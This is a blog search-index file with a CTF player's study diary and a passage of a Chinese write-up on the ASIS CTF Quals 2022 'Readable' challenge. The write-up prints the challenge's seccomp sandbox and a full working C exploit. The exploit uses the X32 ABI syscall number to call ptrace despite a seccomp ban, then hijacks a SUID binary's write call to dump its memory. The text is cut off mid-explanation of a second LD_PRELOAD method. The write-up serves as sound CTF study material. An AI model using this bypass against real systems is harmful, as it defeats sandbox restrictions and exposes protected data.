<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>最近在摸什么鱼</title>
    <link href="/posts/f584cbf7.html"/>
    <url>/posts/f584cbf7.html</url>
    
    <content type="html"><![CDATA[<h2 id="最近在摸什么🐟"><a class="header-anchor" href="#最近在摸什么🐟">¶</a>最近在摸什么🐟</h2><h3 id="2022-10-18"><a class="header-anchor" href="#2022-10-18">¶</a>2022.10.18</h3><p>无意间刷到了一些大师傅的博客，再次感受到了 ctf 的局限性 XD，可能下一步就不重点关注 ctf 了，打打/复现高质量国际赛，不重要的比赛算了=。=</p><p>可以的话，去补一些基础吧，然后开始搞真正的二进制安全XD。</p><p>☀️</p><h3 id="2022-9-19"><a class="header-anchor" href="#2022-9-19">¶</a>2022.9.19</h3><h4 id="加入-Nu1L"><a class="header-anchor" href="#加入-Nu1L">¶</a>加入 <strong>Nu1L</strong></h4><p>得到大师傅们的认可挺开心的，下一步是复现学习一些奇奇怪怪…</p><p>唯热爱与信任不可辜负。</p><p>☀️</p><h3 id="2022-9-12"><a class="header-anchor" href="#2022-9-12">¶</a>2022.9.12</h3><h4 id="开学破防周"><a class="header-anchor" href="#开学破防周">¶</a>开学破防周</h4><p>开学的前几周总是一堆事情，终于有机会更新一下博客。</p><p>暑假其实说闲着也没怎么闲着，打了一些比赛，国赛啊，强网杯，DSCTF，其实都挺不错的，题目都很有意思。就是还是控制不住自己，学习效率其实只有晚上才有，但想到身体重要，也没一直熬夜了…</p><p>自己目前的心还是比较浮躁，希望还是能静下心来，一些初学时候的笔记现在看来存在理解不深瞎🐔霸写的情况。方便起见全下了，也下决心下次再写东西，资料一定要查好，知识点落实好，链接附好。如果有师傅看我的博客，我反而还坑了他一把，那还真是莫大的罪过=.=</p><p>🌧️</p><h3 id="2022-7-3"><a class="header-anchor" href="#2022-7-3">¶</a>2022.7.3</h3><h4 id="放暑假啦！"><a class="header-anchor" href="#放暑假啦！">¶</a>放暑假啦！</h4><p>疫情影响，军训和高数都推迟，提前放假了。暑假可以静下心来做些事情了。</p><p>校内的社团那边也要考虑一下招人工作了，可能有点复杂但必须要去做。</p><p>毕竟没有人一直在打CTF，但CTF总得有人在打。希望永远寄托在后浪。（为什么说的这么正经QwQ</p><p>☁️</p><h3 id="2022-6-15"><a class="header-anchor" href="#2022-6-15">¶</a>2022.6.15</h3><h4 id="赞美-Blog"><a class="header-anchor" href="#赞美-Blog">¶</a>赞美 Blog</h4><p>有点忙不过来。学校安排的课程都快要结课了，总归是要应考，而我自己这边的话课内进度落下的比较多（👴 知道错了），能学自己想学的东西的时间就比较少。</p><p>今天看了些大佬的推文，一些 CVE 的 writeup 只能称之为惊艳。博客真的是个很伟大的东西 awa。</p><p><strong>一个很好用的正则表达式学习网站</strong></p><p><a href="https://regex101.com/">regular expressions 101</a></p><p><strong>Kernel ROP 从 0 到 1</strong></p><p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">Learning Linux Kernel Exploitation - Part 1</a></p><p><strong>一个保姆级从 CVE 学习 Kernel ROP 的教程</strong></p><p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 1/4)</a></p><p><strong>Kernel 写的比较多的博主</strong></p><p><a href="https://www.jianshu.com/u/a12c5b882be2">bsauce</a></p><p><a href="https://kagehutatsu.com/">影二つ</a></p><p><a href="https://arttnba3.cn/">arttnba3</a></p><p>赞美每一个愿意写博客的师傅们，给了我很好的学习机会。</p><p>☀️</p><h3 id="2022-6-12"><a class="header-anchor" href="#2022-6-12">¶</a>2022.6.12</h3><h4 id="当-glibc-随风而去"><a class="header-anchor" href="#当-glibc-随风而去">¶</a>当 glibc 随风而去</h4><p>发现最近的比赛题目都偏向于 <strong>去 glibc 化</strong> 。这个不是咱说的出题不给 glibc 或版本，那种属于出题人要挨🔨。这里说的是出题根本没用到 glibc。</p><p>例如前一段时间比较火的 <strong>musl pwn</strong>，国赛的 <strong>LLVM PASS PWN</strong>，Defcon Quals 2022 的 <strong>Luajit</strong> 。至于 V8，Docker，Qemu 和其他奇奇怪怪的酷炫玩意，以后再碰 👦。</p><p><strong>musl 的一些学习资料</strong></p><p><a href="https://tttang.com/archive/1582/">Musl 程序分析和调试环境配置 &amp;&amp; 部分源码分析 - 0xRGz</a></p><p><a href="https://www.anquanke.com/post/id/246929">musl-1.2.x堆部分源码分析 - 一只狗</a></p><p><strong>LLVM 的一些学习资料</strong></p><p><a href="https://x1ng.top/2021/05/16/ciscn-%E5%88%9D%E8%B5%9B-2021-wp/#satool">ciscn 初赛 2021- SATOOL - X1ng</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/12/21/llvm/">LLVM pass 实现 C++虚表保护 - Clang裁缝店</a></p><p><strong>LuaJIT</strong></p><p><a href="https://0xten.gitbook.io/public/defcon/2022/quals/smugglers-cove">Smuggler’s Cove - 0xTen</a></p><p>☁️</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ASIS CTF Quals 2022 Readable&amp;Jsy</title>
    <link href="/posts/66d9c745.html"/>
    <url>/posts/66d9c745.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>源码和文档才是真 👴🏻，其他的都是假滴，冰红茶滴水</p></blockquote><h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2><p>最近和 <a href="https://strawhat.team/">Strawhat</a> 的师傅们打了 <code>ASIS 2022 Quals</code>，题目都挺不错的。</p><p>其中有俩道是 <code>scanf()</code> 的格式化字符串利用，也就是利用 <code>%0s</code> 实现栈溢出和利用 <code>%9$s</code> 实现栈上任意读入。听起来蛮离谱，但是类比 <code>printf()</code> 一想还是挺正常的 233，抢了个一血。再就是比赛中花了较多时间在下面这道 <code>readable</code> 上，浅浅记录一下做题的过程。顺带复现一下没解出的 jsy。</p><p>把题目放在了<a href="https://drive.google.com/file/d/1fbELLJohPDD4giarKeKmQcvDnLpcAiDV/view?usp=sharing">这里</a>，需要的师傅们可以下载 XD。</p><h2 id="Readable-10-solves"><a class="header-anchor" href="#Readable-10-solves">¶</a>Readable(10 solves)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016010034466.png" alt="image-20221016010034466"></p><p>readable</p><p>Yes, you can read <strong><code>suid</code></strong> executable with <strong><code>strace</code></strong>. but what if you don’t have that?</p><p>Hint: <strong><a href="https://clubby789.me/zer0pts2022/#readflag">a might-be useful blogpost</a></strong>.</p><h3 id="省流"><a class="header-anchor" href="#省流">¶</a>省流</h3><p><strong>Quesion:</strong> 在 seccomp 限制和一些其他的限制下，去获得权限为 <code>111(x)</code>  带有 suid 权限的 readme 程序中的原本的 flag。</p><p><strong>Answer:</strong> 利用 <code>X32 ABI</code> 绕过或者 <code>prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);</code> 把 SUID 🐑 樂 。</p><h3 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h3><p>题目给了俩个源码文件：</p><ul><li><h4 id="readme-c"><a class="header-anchor" href="#readme-c">¶</a><strong>readme.c</strong></h4></li></ul><p>用来输出 flag，但是每次会把 flag 🐑 成其他的字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *flag = <span class="hljs-string">&quot;ASIS&#123;test-flag&#125;&quot;</span>; <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>flag = <span class="hljs-string">&quot;No flag for you&quot;</span>;<br><span class="hljs-built_in">puts</span>(flag);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h4 id="run-c"><a class="header-anchor" href="#run-c">¶</a><strong>run.c</strong></h4></li></ul><p>设置了 seccomp（🐑 掉了 ptrace 等👨🏻打👦🏻的系统调用），🐑 掉了 <code>/proc</code>，更改了 uid 和 gid 为 <code>1000(pwn)</code>，然后执行我们的 exp。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/audit.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> syscall_nr (offsetof(struct seccomp_data, nr))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> arch_nr (offsetof(struct seccomp_data, arch))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARCH_NR AUDIT_ARCH_X86_64</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VALIDATE_ARCHITECTURE                             \</span><br><span class="hljs-meta">  BPF_STMT(BPF_LD + BPF_W + BPF_ABS, arch_nr),            \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, ARCH_NR, 1, 0), \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXAMINE_SYSCALL BPF_STMT(BPF_LD + BPF_W + BPF_ABS, syscall_nr)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DISALLOW_SYSCALL(name)                            \</span><br><span class="hljs-meta">  BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_##name, 0, 1), \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALLOW_SYSCALLS BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">install_filter</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>      VALIDATE_ARCHITECTURE,<br>      EXAMINE_SYSCALL,<br>      DISALLOW_SYSCALL(ptrace),<br>      DISALLOW_SYSCALL(process_vm_readv),<br>      DISALLOW_SYSCALL(process_vm_writev),<br>      ALLOW_SYSCALLS,<br>  &#125;;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> &#123;<br>      .len = (<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>)(<span class="hljs-keyword">sizeof</span>(filter) / <span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>])),<br>      .filter = filter,<br>  &#125;;<br><br>  <span class="hljs-keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="hljs-number">2</span>, &amp;prog)) &#123;<br>    perror(<span class="hljs-string">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">char</span> **)</span> &#123;<br>  install_filter();<br>  <span class="hljs-keyword">if</span> (umount(<span class="hljs-string">&quot;/proc&quot;</span>)) &#123;<br>    perror(<span class="hljs-string">&quot;could not umount procfs&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (setgid(<span class="hljs-number">1000</span>) || setuid(<span class="hljs-number">1000</span>)) &#123;<br>    perror(<span class="hljs-string">&quot;could not drop privs&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-type">char</span> *args = <span class="hljs-literal">NULL</span>;<br>  execve(<span class="hljs-string">&quot;/tmp/exploit&quot;</span>,&amp;args,&amp;args);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/Untitled-1665855700180-4.png" alt="Untitled"></p><ul><li><strong>Dockerfile</strong></li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./stuff/readme /home/pwn/readme</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./stuff/run /home/pwn/run</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R root /home/pwn/*   </span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /home/pwn/run; </span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> 111 /home/pwn/readme;</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> u+s /home/pwn/readme;</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd pwn;</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/home/pwn/run&quot;</span>];</span><br></code></pre></td></tr></table></figure><h3 id="思考"><a class="header-anchor" href="#思考">¶</a>思考</h3><p>题目本身还是比较有意思的，给了 RCE 的机会，想办法去拿到 flag。</p><p>题目本身 Hint 给的阅读材料其实很有价值，通过阅读我们可以总结出一下的几个方法：</p><ul><li>利用 /proc 目录直接读（本题执行了 <code>umount(&quot;/proc&quot;)</code>，🐔）</li><li>利用 <code>LD_PROLOAD</code> 等环境变量，hook 掉关键函数（但是 SUID 程序一般不走这些变量）</li><li>利用 Ptrace 系统调用，即使没有读写权限，也能 hook 掉子进程执行时的 syscall（但是 Ptrace 好像被 ban 了）</li></ul><h3 id="Exp1-X32-ABI"><a class="header-anchor" href="#Exp1-X32-ABI">¶</a>Exp1(X32 ABI)</h3><p>先聊聊比赛的时候我的想法：由于我给新生赛出题塞了个类似的 Seccomp 的缘故😈，第一眼就看到 Seccomp 没有对 <code>X32 ABI</code> 的检测，那么 Ptrace ban 了等于没 ban XD，劫持掉子进程的系统调用就 ok 😎。（这不是白给吗.jpg）</p><p>但很傻的是，在这之前，我以为 <code>X32 ABI</code> 的调用号就是 <code>0x4000000 + SYS_number</code> 这种，对着 <code>0x40000000 + SYS_ptrace</code> 发电了好久，最后差点以为这条路走不通。</p><p>后来通过阅读资料，发现其实真正的系统调用号保存在 <code>/usr/include/x86_64-linux-gnu/asm/unistd_x32.h</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _ASM_X86_UNISTD_X32_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _ASM_X86_UNISTD_X32_H 1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_ioctl (__X32_SYSCALL_BIT + 514)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_readv (__X32_SYSCALL_BIT + 515)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_writev (__X32_SYSCALL_BIT + 516)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_recvfrom (__X32_SYSCALL_BIT + 517)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_sendmsg (__X32_SYSCALL_BIT + 518)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_recvmsg (__X32_SYSCALL_BIT + 519)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_execve (__X32_SYSCALL_BIT + 520)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_ptrace (__X32_SYSCALL_BIT + 521)</span><br>...<br></code></pre></td></tr></table></figure><p>那么我们参考<a href="https://clubby789.me/zer0pts2022/#readflag">原博文</a>，很容易的就可以写出以下利用 Exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/personality.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> base = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> *<span class="hljs-title">regs</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;   <br>    <span class="hljs-comment">// X32 ABI 对指针要求 32 位</span><br>    regs = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x233000</span>,<span class="hljs-number">0x1000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">pid_t</span> traced_process;<br>    <span class="hljs-type">long</span> ins;<br>    <span class="hljs-type">char</span> *argvs[] = &#123;<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// ptrace(PTRACE_TRACEME, 0, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>, argvs, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exec failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    wait(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">int</span> blocked = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Wait until the child makes a syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        <span class="hljs-comment">// ptrace(PTRACE_GETREGS, pid, 0, &amp;regs);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_GETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        <span class="hljs-comment">// 获取程序基址，用 strace 在本地观察得到特征</span><br>        <span class="hljs-keyword">if</span>(regs-&gt;orig_rax == <span class="hljs-number">10</span> &amp;&amp; regs-&gt;rsi==<span class="hljs-number">0x1000</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Mmap Rdi:%08llx\nMmap Rsi:%08llx\nMmap Rdx:%08llx\n&quot;</span>,regs-&gt;rdi,regs-&gt;rsi,regs-&gt;rdx);<br>            base = regs-&gt;rdi;<br>        &#125;<br>        <span class="hljs-comment">// 随便劫持一个 Write 的系统调用，rsi 劫持到基址，rdx 大小大一点</span><br>        <span class="hljs-keyword">if</span> (regs-&gt;orig_rax == <span class="hljs-number">1</span> &amp;&amp; regs-&gt;rdx == <span class="hljs-number">0x10</span>) &#123;<br>            blocked = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi before:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            regs-&gt;rdx = <span class="hljs-number">0x2000</span>;<br>            regs-&gt;rsi = base;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi after:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            <span class="hljs-comment">// ptrace(PTRACE_SETREGS, pid, 0, regs);</span><br>            syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        &#125;<br>        <span class="hljs-comment">// Continue on with the now blocked syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// If the program checks return value of the write, we need to make sure that the return value isn&#x27;t `-ENOSYS`</span><br>        <span class="hljs-comment">// if (blocked) &#123;regs-&gt;rax = 1; ptrace(PTRACE_SETREGS, pid, 0, regs); &#125;</span><br>        <span class="hljs-keyword">if</span> (blocked) &#123;regs-&gt;rax = <span class="hljs-number">1</span>; syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs); <span class="hljs-keyword">break</span>;&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016020408849.png" alt="image-20221016020408849"></p><h3 id="Exp2-LD-PRELOAD"><a class="header-anchor" href="#Exp2-LD-PRELOAD">¶</a>Exp2(LD_PRELOAD)</h3><p>结束后在 Discord 看到空白师傅发的 Exp，陷入了沉思 🤔：</p><p><img src="D:/Blog/n1ghtu/source/_posts/assets/image-20221016022109570.png" alt="image-20221016022109570"></p><p>我们知道，设置了 SUID 的程序（本题的 <code>readme</code>）一般不走 LD_PRELOAD 等环境变量(<a href="https://linux.die.net/man/8/ld.so">文档</a>)。</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">LD_PRELOAD</span><br>要在所有其他共享库之前加载的附加的、用户指定的 <span class="hljs-string">ELF</span> 共享库的列表。列表中的项目可以用空格或冒号分隔。这可用于选择性地覆盖其他共享库中的函数。使用描述下给出的规则搜索库。对于 <span class="hljs-built_in">set-user-ID/set-group-ID</span> <span class="hljs-string">ELF</span> 二进制文件，包含斜杠的预加载路径名将被忽略，并且只有在库文件上启用了 <span class="hljs-built_in">set-user-ID</span> 权限位时才会加载标准搜索目录中的库。<br><span class="hljs-string">LD_DEBUG</span><br>（<span class="hljs-string">glibc</span> 自 <span class="hljs-string">2</span>.<span class="hljs-string">1</span> 起）输出有关动态链接器的详细调试信息。如果设置为<span class="hljs-string">all</span>，则打印它拥有的所有调试信息，如果设置为 <span class="hljs-string">help</span> 